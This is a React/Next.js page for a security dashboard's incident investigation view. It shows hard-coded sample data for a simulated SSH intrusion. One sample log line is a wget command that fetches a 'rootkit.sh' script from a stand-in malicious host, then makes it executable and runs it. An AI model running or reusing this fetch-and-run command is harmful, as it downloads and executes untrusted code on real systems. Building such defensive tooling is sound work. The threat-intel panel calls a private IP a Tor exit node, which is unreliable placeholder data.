"use client";

import { useState } from 'react';
import Link from 'next/link';
import { useParams } from 'next/navigation';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { ArrowLeft, Activity, ShieldAlert, KeyRound, Server, User, Terminal } from 'lucide-react';
import { AlertCorrelationGraph } from '@/components/shared/AlertCorrelationGraph';

export default function IncidentInvestigation() {
  const params = useParams();
  const id = params?.id || 'INC-2041';
  
  const [activeTab, setActiveTab] = useState('overview');

  const timeline = [
    { time: '14:23:10', icon: Activity, title: 'Reconnaissance Detected', desc: 'Port scanning observed from 192.168.1.105 targeting SSH and HTTP.', color: 'text-orange-500' },
    { time: '14:35:05', icon: KeyRound, title: 'Credential Access', desc: 'Multiple failed SSH login attempts for user "admin".', color: 'text-yellow-500' },
    { time: '14:38:12', icon: KeyRound, title: 'Valid Accounts', desc: 'Successful SSH login using compromised credentials.', color: 'text-red-500' },
    { time: '14:45:00', icon: Server, title: 'Command Execution', desc: 'Execution of unauthorized shell script: rootkit.sh.', color: 'text-red-500' },
    { time: '14:46:15', icon: ShieldAlert, title: 'Incident Created', desc: 'Automated response triggered. Asset isolated.', color: 'text-blue-500' },
  ];

  return (
    <div className="space-y-6 h-full flex flex-col animate-in fade-in duration-500">
      <header className="flex flex-col gap-4">
        <Link href="/incidents" className="text-sm text-gray-400 hover:text-white flex items-center gap-2 w-fit transition-colors">
          <ArrowLeft size={16} /> Back to Incidents
        </Link>
        <div className="flex justify-between items-start">
          <div>
            <div className="flex items-center gap-3">
              <h2 className="text-3xl font-bold flex items-center gap-3">
                {id}: APT Lateral Movement
              </h2>
              <Badge variant="destructive" className="text-sm bg-red-600">CRITICAL</Badge>
              <Badge variant="outline" className="text-sm bg-orange-500/20 text-orange-400 border-orange-500/50">OPEN</Badge>
            </div>
            <p className="text-gray-400 mt-2">Investigating suspected credential theft and lateral movement via SSH.</p>
          </div>
          <div className="flex gap-2">
            <Button variant="outline" className="border-red-500/50 text-red-400 hover:bg-red-500/20">Isolate Host</Button>
            <Button variant="default" className="bg-blue-600 hover:bg-blue-700">Assign to Me</Button>
          </div>
        </div>
      </header>

      <div className="grid grid-cols-1 xl:grid-cols-3 gap-6 flex-1">
        
        {/* Main Content Area (2 columns) */}
        <div className="xl:col-span-2 space-y-6 flex flex-col">
          
          <Card className="bg-gray-900 border-gray-800">
            <CardHeader className="border-b border-gray-800 pb-4">
              <CardTitle>Attack Chain Correlation</CardTitle>
            </CardHeader>
            <CardContent className="p-0 border-none">
              <AlertCorrelationGraph />
            </CardContent>
          </Card>

          <Card className="bg-gray-900 border-gray-800 flex-1">
            <CardHeader className="border-b border-gray-800 pb-0">
              <div className="flex gap-6">
                <button 
                  onClick={() => setActiveTab('overview')}
                  className={`pb-4 text-sm font-medium border-b-2 transition-colors ${activeTab === 'overview' ? 'border-blue-500 text-white' : 'border-transparent text-gray-500 hover:text-gray-300'}`}
                >
                  Event Logs
                </button>
                <button 
                  onClick={() => setActiveTab('notes')}
                  className={`pb-4 text-sm font-medium border-b-2 transition-colors ${activeTab === 'notes' ? 'border-blue-500 text-white' : 'border-transparent text-gray-500 hover:text-gray-300'}`}
                >
                  Analyst Notes
                </button>
              </div>
            </CardHeader>
            <CardContent className="p-6">
              {activeTab === 'overview' ? (
                <div className="space-y-4 font-mono text-xs text-gray-300">
                  <div className="p-4 bg-gray-950 rounded-md border border-gray-800 flex flex-col sm:flex-row gap-2 sm:gap-4">
                    <span className="text-gray-500 shrink-0">14:38:12</span>
                    <span className="text-blue-400 shrink-0">sshd[10243]:</span>
                    <span>Accepted password for admin from 192.168.1.105 port 54321 ssh2</span>
                  </div>
                  <div className="p-4 bg-gray-950 rounded-md border border-gray-800 flex flex-col sm:flex-row gap-2 sm:gap-4">
                    <span className="text-gray-500 shrink-0">14:45:00</span>
                    <span className="text-blue-400 shrink-0">bash[10245]:</span>
                    <span className="text-red-400 break-all">wget http://malicious.io/rootkit.sh -O /tmp/r.sh && chmod +x /tmp/r.sh && /tmp/r.sh</span>
                  </div>
                  <div className="p-4 bg-gray-950 rounded-md border border-gray-800 flex flex-col sm:flex-row gap-2 sm:gap-4">
                    <span className="text-gray-500 shrink-0">14:45:02</span>
                    <span className="text-blue-400 shrink-0">kernel:</span>
                    <span>[ 1234.567] rootkit.sh injected module into running kernel</span>
                  </div>
                </div>
              ) : (
                <div className="space-y-4">
                  <textarea 
                    className="w-full h-32 bg-gray-950 border border-gray-800 rounded-md p-3 text-sm focus:outline-none focus:ring-1 focus:ring-blue-500 resize-none text-gray-200"
                    placeholder="Add investigation notes here..."
                  ></textarea>
                  <Button size="sm">Save Note</Button>
                </div>
              )}
            </CardContent>
          </Card>
        </div>

        {/* Sidebar Area (1 column) */}
        <div className="space-y-6 flex flex-col">
          
          <Card className="bg-gray-900 border-gray-800">
            <CardHeader className="border-b border-gray-800 pb-4">
              <CardTitle className="text-lg">Incident Timeline</CardTitle>
            </CardHeader>
            <CardContent className="p-6">
              <div className="space-y-6">
                {timeline.map((item, i) => {
                  const Icon = item.icon;
                  return (
                    <div key={i} className="flex gap-4">
                      <div className="flex flex-col items-center">
                        <div className="flex items-center justify-center w-8 h-8 rounded-full border border-gray-800 bg-gray-950 shrink-0 shadow">
                          <Icon size={14} className={item.color} />
                        </div>
                        {i < timeline.length - 1 && <div className="w-px h-full bg-gray-800 my-1"></div>}
                      </div>
                      <div className="pb-6">
                        <div className="flex items-center gap-2 mb-1">
                          <div className="font-semibold text-sm text-gray-200">{item.title}</div>
                          <time className="font-mono text-xs text-gray-500 ml-auto">{item.time}</time>
                        </div>
                        <div className="text-gray-400 text-xs">{item.desc}</div>
                      </div>
                    </div>
                  );
                })}
              </div>
            </CardContent>
          </Card>

          <Card className="bg-gray-900 border-gray-800">
            <CardHeader className="border-b border-gray-800 pb-4">
              <CardTitle className="text-lg">Threat Intel</CardTitle>
            </CardHeader>
            <CardContent className="p-6 space-y-4">
              <div>
                <p className="text-xs text-gray-500 uppercase tracking-wider mb-2">Attacker IP</p>
                <div className="flex items-center justify-between p-3 bg-gray-950 rounded border border-gray-800">
                  <span className="font-mono text-red-400">192.168.1.105</span>
                  <Badge variant="outline" className="bg-red-500/20 text-red-400 border-red-500/50">Malicious</Badge>
                </div>
                <p className="text-xs text-gray-400 mt-2">Known Tor Exit Node. Associated with recent ransomware campaigns.</p>
              </div>
              <div className="pt-4 border-t border-gray-800">
                <p className="text-xs text-gray-500 uppercase tracking-wider mb-2">Related Entities</p>
                <div className="space-y-2">
                  <div className="flex items-center gap-2 text-sm text-gray-300">
                    <User size={14} className="text-gray-500" /> User: admin
                  </div>
                  <div className="flex items-center gap-2 text-sm text-gray-300">
                    <Terminal size={14} className="text-gray-500" /> File: rootkit.sh
                  </div>
                </div>
              </div>
            </CardContent>
          </Card>

        </div>
      </div>
    </div>
  );
}
